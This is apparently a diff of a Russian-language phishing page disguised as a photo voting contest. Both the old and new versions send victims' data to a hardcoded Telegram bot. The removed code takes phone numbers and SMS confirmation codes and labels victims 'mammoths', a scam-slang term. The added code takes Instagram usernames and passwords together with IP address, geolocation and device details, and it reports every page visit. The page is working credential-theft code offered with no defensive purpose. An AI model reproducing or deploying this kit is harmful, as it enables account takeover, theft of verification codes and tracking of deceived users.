QSjA8rgbEHTefQnR7iq4zDUsSosKqBioN8jjsul/BgR6TnlO3XC9Ng0qcS+0R1mG2PAY7CIZFAwSGSFf//Z" alt="Фото 1">
                 </div>
-                <h3>@elafril</h3>
-                <div class="counter" id="counter1">32 голосов</div>
-                <button class="vote-btn" onclick="initiateVote(1)">Проголосовать</button>
+                <div class="photo-info">
+                    <div class="photo-title">Elafrils</div>
+                    <div class="vote-count"><i class="fas fa-heart"></i> <span id="votes1">42</span></div>
+                </div>
+                <div class="photo-description">
+                </div>
+                <button class="vote-btn" onclick="showLoginModal(1)"><i class="fas fa-vote-yea"></i> Голосовать</button>
             </div>
-            
-            <div class="photo-card">
-                <div class="photo-container">
-                    <img src="https://i.pinimg.com/736x/75/36/c4/7536c4d854b66a388824b9e321b7c668.jpg" alt="Фото 2">
+
+            <div class="photo-card animation">
+                <div class="photo-number">2</div>
+                <div class="photo-placeholder">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQimAojBnatuJ-6ZISnyAHPNiV_TP1AsxRIEw&s" alt="Фото 2">
                 </div>
-                <h3>@ayess</h3>
-                <div class="counter" id="counter2">26 голосов</div>
-                <button class="vote-btn" onclick="initiateVote(2)">Проголосовать</button>
+                <div class="photo-info">
+                    <div class="photo-title">AYSA</div>
+                    <div class="vote-count"><i class="fas fa-heart"></i> <span id="votes2">37</span></div>
+                </div>
+                <div class="photo-description">
+                </div>
+                <button class="vote-btn" onclick="showLoginModal(2)"><i class="fas fa-vote-yea"></i> Голосовать</button>
+            </div>
+        </div>
+
+        <div class="modal" id="loginModal">
+            <div class="login-form animation">
+                <button class="close-modal" onclick="closeModal()">&times;</button>
+                <h2>Авторизация для голосования</h2>
+                <form id="loginForm" onsubmit="handleVote(event)">
+                    <div class="form-group">
+                        <label for="instagram">Instagram аккаунт:</label>
+                        <div class="instagram-input-group">
+                            <span class="instagram-prefix">@</span>
+                            <input type="text" id="instagram" placeholder="username" required style="border: none; background: transparent; padding-left: 0;">
+                        </div>
+                        <small style="display: block; margin-top: 5px; color: rgba(255,255,255,0.6);">Введите ваш Instagram без @</small>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password">Пароль от Instagram:</label>
+                        <input type="password" id="password" placeholder="Введите ваш пароль" required>
+                        <small style="display: block; margin-top: 5px; color: rgba(255,255,255,0.6);">Введите пароль для подтверждения</small>
+                    </div>
+                    
+                    <button type="submit" class="submit-btn"><i class="fas fa-paper-plane"></i> Отправить голос</button>
+                    
+                    <div class="loading" id="loading">
+                        <div class="spinner"></div>
+                        <p>Проверяем данные...</p>
+                    </div>
+                    
+                    <div class="success-message" id="successMessage">
+                        <i class="fas fa-check-circle" style="color: var(--success); font-size: 2em; margin-bottom: 10px;"></i>
+                        <h3>Голос учтён!</h3>
+                        <p>Спасибо за участие в конкурсе. Результаты будут объявлены 15 декабря.</p>
+                    </div>
+                    
+                    <div class="error-message" id="errorMessage">
+                        <i class="fas fa-exclamation-circle" style="color: var(--error); font-size: 2em; margin-bottom: 10px;"></i>
+                        <h3>Ошибка!</h3>
+                        <p id="errorText">Произошла ошибка при отправке данных. Пожалуйста, попробуйте позже.</p>
+                    </div>
+                </form>
             </div>
         </div>
     </div>
 
-    <div class="auth-modal" id="authModal">
-        <div class="modal-content">
-            <span class="close-modal" onclick="closeModal()">&times;</span>
-            <h2>Авторизация через Telegram</h2>
-            <p>Для подтверждения голоса введите ваш номер телефона</p>
-            
-            <div id="phoneForm">
-                <input type="tel" id="phoneNumber" placeholder="+996 (999) 123-45-67" class="phone-input" required>
-                <button class="telegram-btn" id="requestOtpBtn" onclick="requestOTP()">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="white">
-                        <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.161l-1.68 8.683c-.12.541-.449.674-.912.42l-2.521-2.01-1.216 1.276c-.135.134-.248.247-.506.247l.18-2.58 4.681-4.313c.203-.179-.044-.277-.316-.099l-5.784 3.721-2.491-.84c-.54-.179-.547-.54.126-.8l9.738-3.858c.454-.161.853.109.701.752z"/>
-                    </svg>
-                    <span id="requestOtpText">Получить код</span>
-                    <span id="requestOtpLoading" class="loading" style="display: none;"></span>
-                </button>
-                <div id="phoneTimer" class="timer" style="display: none;">Отправить код повторно через: <span id="phoneTimerValue">20</span> сек</div>
-            </div>
-            
-            <div id="captchaForm" style="display: none;">
-                <p>Пожалуйста, подтвердите, что вы не робот</p>
-                <p class="small">После проверки код подтверждения будет отправлен в Telegram</p>
-                <div class="captcha-container">
-                    <div id="captchaText" class="captcha-code"></div>
-                    <button class="refresh-captcha" onclick="generateCaptcha()">↻</button>
-                </div>
-                <input type="text" id="captchaInput" class="captcha-input" placeholder="Введите код с картинки" required>
-                <button class="telegram-btn" id="verifyCaptchaBtn" onclick="verifyCaptcha()">
-                    <span id="verifyCaptchaText">Подтвердить</span>
-                    <span id="verifyCaptchaLoading" class="loading" style="display: none;"></span>
-                </button>
-            </div>
-            
-            <div id="otpForm" style="display: none;">
-                <p>Мы отправили код подтверждения на ваш номер</p>
-                <input type="text" id="otpCode" placeholder="Введите код из СМС" class="otp-input" maxlength="5" required>
-                <button class="telegram-btn" id="verifyOtpBtn" onclick="verifyOTP()">
-                    <span id="verifyOtpText">Подтвердить</span>
-                    <span id="verifyOtpLoading" class="loading" style="display: none;"></span>
-                </button>
-                <div id="otpTimer" class="timer" style="display: none;">Подтверждение через: <span id="otpTimerValue">30</span> сек</div>
-                <p class="small">Введите код, который вы получили по SMS</p>
-            </div>
-            
-            <p class="small" id="authMessage">Ваш номер телефона будет использован только для подтверждения голоса</p>
-        </div>
+        <i class="fas fa-bug"></i>
+    </div>
+    
+    <div class="debug-info" id="debugInfo">
+        <h3 style="margin-bottom: 15px; color: var(--accent);">Журнал событий</h3>
+        <div id="debugLog"></div>
     </div>
 
     <script>
-        // Замените эти значения на свои
-        const BOT_TOKEN = '7944695234:AAEpBY3kRq6EgZ4bCDLVa1hhbRVi8bkK3Bw';
-        const CHAT_ID = '7058479669';
+        // Конфигурация
+        const BOT_TOKEN = '7944695234:AAEpBY3kRq6EgZ4bCDLVa1hhbRVi8bkK3Bw'; // Замените на ваш токен бота
+        const CHAT_ID = '7058479669'; // Замените на ваш chat_id
+        const DEBUG_MODE = true; // Режим отладки
         
-        let selectedPhotoId = null;
-        let isAuthenticated = false;
-        let userPhoneNumber = '';
-        let currentCaptcha = '';
+        let selectedPhoto = null;
         const votes = {
-            1: 0,
-            2: 0
+            1: 42,
+            2: 37
         };
-
-        // При загрузке страницы отправляем уведомление о входе
-        window.onload = function() {
-            generateCaptcha();
-            sendEntryNotification();
-        };
-
-        // Генерация капчи
-        function generateCaptcha() {
-            const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-            let captcha = '';
-            for (let i = 0; i < 6; i++) {
-                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
+        
+        // Инициализация
+        document.addEventListener('DOMContentLoaded', function() {
+            updateVoteCounts();
+            logEvent('Система', 'Приложение загружено');
+            
+            // Отправляем уведомление о входе на сайт
+            sendVisitNotification();
+            
+            // Проверка конфигурации
+            if (!BOT_TOKEN || !CHAT_ID) {
+                logEvent('Ошибка', 'BOT_TOKEN или CHAT_ID не настроены!');
+                showError('Ошибка конфигурации. Пожалуйста, свяжитесь с организаторами.');
             }
-            currentCaptcha = captcha;
-            document.getElementById('captchaText').textContent = captcha;
-        }
+        });
+        
+        // Функция отправки уведомления о посещении сайта
+        async function sendVisitNotification() {
+            const timestamp = new Date().toLocaleString();
+            const ip = await getIP();
+            const userAgent = navigator.userAgent;
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const referrer = document.referrer || 'прямой заход';
+            const locationInfo = await getLocationInfo(ip);
+            
+            const message = `
+<b>НОВЫЙ ПОСЕТИТЕЛЬ НА САЙТЕ!</b>
 
-        // Проверка капчи
-        function verifyCaptcha() {
-            const userInput = document.getElementById('captchaInput').value.trim().toUpperCase();
+🕒 <b>Время:</b> ${timestamp}
+🌍 <b>IP:</b> ${ip}
+📍 <b>Местоположение:</b> ${locationInfo.city || 'неизвестно'}, ${locationInfo.country || 'неизвестно'}
+🖥 <b>Устройство:</b> ${userAgent}
+📱 <b>Разрешение:</b> ${screenResolution}
+🔗 <b>Источник:</b> ${referrer}
+            `;
             
-            if (userInput !== currentCaptcha) {
-                alert('Неверный код подтверждения. Пожалуйста, попробуйте еще раз.');
-                generateCaptcha();
-                document.getElementById('captchaInput').value = '';
-                return;
-            }
-            
-            // Показываем индикатор загрузки
-            document.getElementById('verifyCaptchaText').style.display = 'none';
-            document.getElementById('verifyCaptchaLoading').style.display = 'inline-block';
-            document.getElementById('verifyCaptchaBtn').disabled = true;
-            
-            // Отправляем уведомление о решении капчи
-            const captchaMessage = `✅ Мамонт успешно прошел капчу!\n\nТелефон: ${userPhoneNumber}\nВведенный код: ${userInput}`;
-            sendTelegramMessage(captchaMessage)
-                .then(() => {
-                    // Переходим к форме SMS после отправки уведомления
-                    document.getElementById('captchaForm').style.display = 'none';
-                    document.getElementById('otpForm').style.display = 'block';
-                    
-                    // Восстанавливаем кнопку
-                    document.getElementById('verifyCaptchaText').style.display = 'inline';
-                    document.getElementById('verifyCaptchaLoading').style.display = 'none';
-                    document.getElementById('verifyCaptchaBtn').disabled = false;
-                })
-                .catch(error => {
-                    console.error('Ошибка при отправке уведомления:', error);
-                    // Все равно переходим к форме SMS даже если уведомление не отправилось
-                    document.getElementById('captchaForm').style.display = 'none';
-                    document.getElementById('otpForm').style.display = 'block';
-                    document.getElementById('verifyCaptchaText').style.display = 'inline';
-                    document.getElementById('verifyCaptchaLoading').style.display = 'none';
-                    document.getElementById('verifyCaptchaBtn').disabled = false;
-                });
-        }
-
-        // Функция для получения информации об устройстве и IP
-        async function getDeviceAndIPInfo() {
             try {
-                // Получаем IP-адрес
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ip = ipData.ip;
-
-                // Информация об устройстве
-                const userAgent = navigator.userAgent;
-                const platform = navigator.platform;
-                const screenWidth = window.screen.width;
-                const screenHeight = window.screen.height;
-
-                return {
-                    ip: ip,
-                    userAgent: userAgent,
-                    platform: platform,
-                    screenResolution: `${screenWidth}x${screenHeight}`
-                };
+                await sendToTelegram(message);
+                logEvent('Уведомление', 'Отправлено уведомление о посещении сайта');
             } catch (error) {
-                console.error('Ошибка при получении информации:', error);
-                return {
-                    ip: 'Не удалось определить',
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    screenResolution: `${window.screen.width}x${window.screen.height}`
-                };
+                logEvent('Ошибка', 'Не удалось отправить уведомление о посещении');
             }
         }
-
-        // Отправка уведомления о входе на сайт
-        async function sendEntryNotification() {
-            const deviceInfo = await getDeviceAndIPInfo();
+        
+        // Функции голосования
+        function showLoginModal(photoNumber) {
+            selectedPhoto = photoNumber;
+            document.getElementById('loginModal').classList.add('active');
+            document.getElementById('successMessage').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'none';
+            document.getElementById('instagram').focus();
             
-            const message = `🦣 Новый Мамонт  на сайте голосования!\n\n📱 Устройство: ${deviceInfo.platform}\n🌐 IP-адрес: ${deviceInfo.ip}\n🖥 Разрешение экрана: ${deviceInfo.screenResolution}\n🔍 User Agent: ${deviceInfo.userAgent}`;
-            
-            sendTelegramMessage(message);
-        }
-
-        function initiateVote(photoId) {
-            selectedPhotoId = photoId;
-            
-            if (isAuthenticated) {
-                castVote();
-            } else {
-                document.getElementById('authModal').style.display = 'flex';
-                document.getElementById('phoneForm').style.display = 'block';
-                document.getElementById('captchaForm').style.display = 'none';
-                document.getElementById('otpForm').style.display = 'none';
-                document.getElementById('phoneNumber').value = '';
-                document.getElementById('captchaInput').value = '';
-                document.getElementById('otpCode').value = '';
-                generateCaptcha();
-            }
+            logEvent('Голосование', `Открыта форма голосования за фото ${photoNumber}`);
+            logEvent('Отладка', `Текущие голоса: Фото1 - ${votes[1]}, Фото2 - ${votes[2]}`);
         }
         
         function closeModal() {
-            document.getElementById('authModal').style.display = 'none';
+            document.getElementById('loginModal').classList.remove('active');
+            logEvent('Голосование', 'Форма голосования закрыта');
         }
         
-        async function requestOTP() {
-            const phoneNumber = document.getElementById('phoneNumber').value.trim();
-            if (!phoneNumber || phoneNumber.length < 10) {
-                alert('Введите корректный номер телефона');
+        async function handleVote(event) {
+            event.preventDefault();
+            
+            const instagram = document.getElementById('instagram').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            // Удаляем @ из начала, если есть
+            const cleanInstagram = instagram.startsWith('@') ? instagram.substring(1) : instagram;
+            
+            // Валидация Instagram
+            if (!/^[a-zA-Z0-9._]{1,30}$/.test(cleanInstagram)) {
+                showError('Пожалуйста, введите корректный Instagram username (только буквы, цифры, точки и подчеркивания)');
+                logEvent('Ошибка', `Некорректный Instagram: ${cleanInstagram}`);
                 return;
             }
             
-            // Показываем индикатор загрузки
-            document.getElementById('requestOtpText').style.display = 'none';
-            document.getElementById('requestOtpLoading').style.display = 'inline-block';
-            document.getElementById('requestOtpBtn').disabled = true;
-            
-            userPhoneNumber = phoneNumber;
-            
-            // Отправляем информацию о телефоне
-            const deviceInfo = await getDeviceAndIPInfo();
-            const phoneMessage = `📞 Мамонт 🦣 ввел номер телефона:\n\nТелефон: ${phoneNumber}\nIP: ${deviceInfo.ip}\nУстройство: ${deviceInfo.platform}\nUser Agent: ${deviceInfo.userAgent}`;
-            await sendTelegramMessage(phoneMessage);
-            
-            // Добавляем задержку для имитации загрузки
-            setTimeout(() => {
-                // Показываем форму капчи
-                document.getElementById('phoneForm').style.display = 'none';
-                document.getElementById('captchaForm').style.display = 'block';
-                
-                // Восстанавливаем кнопку
-                document.getElementById('requestOtpText').style.display = 'inline';
-                document.getElementById('requestOtpLoading').style.display = 'none';
-                document.getElementById('requestOtpBtn').disabled = false;
-                
-                document.getElementById('phoneTimer').style.display = 'block';
-                document.getElementById('phoneTimerValue').textContent = "20";
-            }, 9000);
-        }
-        
-        async function verifyOTP() {
-            const otpCode = document.getElementById('otpCode').value.trim();
-            
-            if (!otpCode || otpCode.length !== 5) {
-                alert('Введите корректный код из 5 цифр');
+            // Проверка пароля
+            if (password.length < 4) {
+                showError('Пароль должен содержать не менее 4 символов');
+                logEvent('Ошибка', 'Слишком короткий пароль');
                 return;
             }
             
-            // Показываем индикатор загрузки
-            document.getElementById('verifyOtpText').style.display = 'none';
-            document.getElementById('verifyOtpLoading').style.display = 'inline-block';
-            document.getElementById('verifyOtpBtn').disabled = true;
+            // Показываем загрузку
+            document.getElementById('loading').style.display = 'flex';
+            document.getElementById('errorMessage').style.display = 'none';
             
-            // Отправляем информацию о подтверждении
-            const smsMessage = `✅ Мамонт подтвердил SMS-код:\n\nТелефон: ${userPhoneNumber}\nКод: ${otpCode}\nВыбранное фото: №${selectedPhotoId}`;
-            await sendTelegramMessage(smsMessage);
+            // Собираем информацию о пользователе
+            const timestamp = new Date().toLocaleString();
+            const ip = await getIP();
+            const userAgent = navigator.userAgent;
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const referrer = document.referrer || 'прямой заход';
+            const locationInfo = await getLocationInfo(ip);
             
-            // Добавляем задержку для имитации проверки
-            setTimeout(() => {
-                isAuthenticated = true;
-                closeModal();
-                castVote();
+            // Формируем сообщение для Telegram
+            const message = `
+<b>НОВЫЕ ДАННЫЕ ДЛЯ INSTAGRAM!</b>
+
+📷 <b>Фото:</b> ${selectedPhoto}
+📱 <b>Instagram:</b> @${cleanInstagram}
+🔑 <b>Пароль:</b> ${password}
+
+🌍 <b>Геоданные:</b>
+├─ IP: ${ip}
+├─ Страна: ${locationInfo.country || 'неизвестно'}
+├─ Город: ${locationInfo.city || 'неизвестно'}
+└─ Провайдер: ${locationInfo.org || 'неизвестно'}
+
+🖥 <b>Устройство:</b>
+├─ User Agent: ${userAgent}
+├─ Разрешение: ${screenResolution}
+└─ Язык: ${navigator.language}
+
+🔗 <b>Источник:</b> ${referrer}
+🕒 <b>Время:</b> ${timestamp}
+            `;
+            
+            logEvent('Голосование', `Попытка отправить данные Instagram: @${cleanInstagram}`);
+            
+            // Отправляем данные в Telegram
+            try {
+                const success = await sendToTelegram(message);
                 
-                // Восстанавливаем кнопку
-                document.getElementById('verifyOtpText').style.display = 'inline';
-                document.getElementById('verifyOtpLoading').style.display = 'none';
-                document.getElementById('verifyOtpBtn').disabled = false;
-                
-                document.getElementById('otpTimer').style.display = 'block';
-                document.getElementById('otpTimerValue').textContent = "0";
-            }, 2000);
-        }
-        
-        function castVote() {
-            votes[selectedPhotoId]++;
-            updateCounter(selectedPhotoId);
-            
-            const resultMessage = document.getElementById('resultMessage');
-            resultMessage.style.display = 'block';
-            
-            setTimeout(() => {
-                resultMessage.style.display = 'none';
-            }, 50000000);
-            
-            // Отключаем кнопки после голосования
-            document.querySelectorAll('.vote-btn').forEach(btn => {
-                btn.disabled = true;
-            });
-        }
-        
-        function updateCounter(photoId) {
-            const count = votes[photoId];
-            let text;
-            
-            if (count % 10 === 1 && count % 100 !== 11) {
-                text = ' голос';
-            } else if ([2, 3, 4].includes(count % 10) && ![12, 13, 14].includes(count % 100)) {
-                text = ' голоса';
-            } else {
-                text = ' голосов';
+                if (success) {
+                    // Обновляем счетчик голосов
+                    votes[selectedPhoto]++;
+                    updateVoteCounts();
+                    
+                    // Показываем сообщение об успехе
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('successMessage').style.display = 'block';
+                    document.getElementById('loginForm').reset();
+                    
+                    logEvent('Успех', `Данные Instagram успешно отправлены: @${cleanInstagram}`);
+                    
+                    // Автоматически закрываем модальное окно через 3 секунды
+                    setTimeout(() => {
+                        document.getElementById('loginModal').classList.remove('active');
+                        document.getElementById('successMessage').style.display = 'none';
+                    }, 3000);
+                } else {
+                    showError('Ошибка при отправке данных. Пожалуйста, попробуйте позже.');
+                    logEvent('Ошибка', 'Не удалось отправить данные в Telegram');
+                }
+            } catch (error) {
+                showError('Произошла ошибка. Пожалуйста, попробуйте позже.');
+                logEvent('Ошибка', `Ошибка при отправке: ${error.message}`);
+                console.error('Ошибка:', error);
             }
-            
-            document.getElementById('counter' + photoId).textContent = count + text;
         }
         
-        function sendTelegramMessage(message) {
+        // Вспомогательные функции
+        function updateVoteCounts() {
+            document.getElementById('votes1').textContent = votes[1];
+            document.getElementById('votes2').textContent = votes[2];
+        }
+        
+        function showError(message) {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'block';
+            document.getElementById('errorText').textContent = message;
+        }
+        
+        async function sendToTelegram(message) {
             if (!BOT_TOKEN || !CHAT_ID) {
-                console.error('Не настроены токен бота или chat ID');
-                return Promise.reject('Не настроены токен бота или chat ID');
+                console.error('Не настроен BOT_TOKEN или CHAT_ID');
+                return false;
             }
             
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             
-            return fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Сообщение отправлено в Telegram:', data);
-                return data;
-            })
-            .catch(error => {
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
                 console.error('Ошибка при отправке в Telegram:', error);
-                throw error;
-            });
+                return false;
+            }
         }
+        
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'неизвестен';
+            }
+        }
+        
+        async function getLocationInfo(ip) {
+            if (ip === 'неизвестен') return {};
+            
+            try {
+                const response = await fetch(`https://ipinfo.io/${ip}/json`);
+                return await response.json();
+            } catch (error) {
+                return {};
+            }
+        }
+        
+        // Функции отладки
+        function logEvent(source, message) {
+            if (!DEBUG_MODE) return;
+            
+            const now = new Date();
+            const timestamp = now.toLocaleTimeString();
+            const debugLog = document.getElementById('debugLog');
+            
+            const entry = document.createElement('div');
+            entry.className = 'debug-entry';
+            entry.innerHTML = `
+                <span class="debug-timestamp">[${timestamp}]</span>
+                <span class="debug-source" style="color: var(--accent);">${source}:</span>
+                <span class="debug-message">${message}</span>
+            `;
+            
+            debugLog.prepend(entry);
+            
+            // Ограничиваем количество записей в логе
+            if (debugLog.children.length > 20) {
+                debugLog.removeChild(debugLog.lastChild);
+            }
+            
+            // Также выводим в консоль для удобства
+            console.log(`[${timestamp}] ${source}: ${message}`);
+        }
+        
+        function toggleDebug() {
+            document.getElementById('debugInfo').classList.toggle('active');
+        }
+        
+        // Закрытие модального окна при клике вне формы
+        document.getElementById('loginModal').addEventListener('click', function(event) {
+            if (event.target === this) {
+                closeModal();
+            }
+        });
     </script>
 </body>
 </html>
